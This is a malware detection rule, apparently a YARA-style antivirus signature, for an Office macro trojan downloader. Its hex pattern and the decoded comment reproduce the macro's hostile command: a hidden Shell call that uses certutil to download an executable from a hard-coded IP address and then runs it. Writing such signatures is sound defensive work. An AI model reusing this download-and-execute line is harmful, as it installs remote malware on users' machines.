
rule TrojanDownloader_O97M_EncDoc_KE_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.KE!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 38 35 2e 32 34 36 2e 32 32 30 2e 36 35 2f 6c 65 65 2f 49 4d 47 5f 35 36 37 36 36 39 30 30 2e 65 78 65 22 22 20 4f 79 69 66 66 66 73 69 69 71 78 76 6f 79 6b 6f 66 74 77 76 6e 76 70 77 2e 65 78 65 2e 65 78 65 20 26 26 20 4f 79 69 66 66 66 73 69 69 71 78 76 6f 79 6b 6f 66 74 77 76 6e 76 70 77 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""http://185.246.220.65/lee/IMG_56766900.exe"" Oyifffsiiqxvoykoftwvnvpw.exe.exe && Oyifffsiiqxvoykoftwvnvpw.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1) >=1
 
}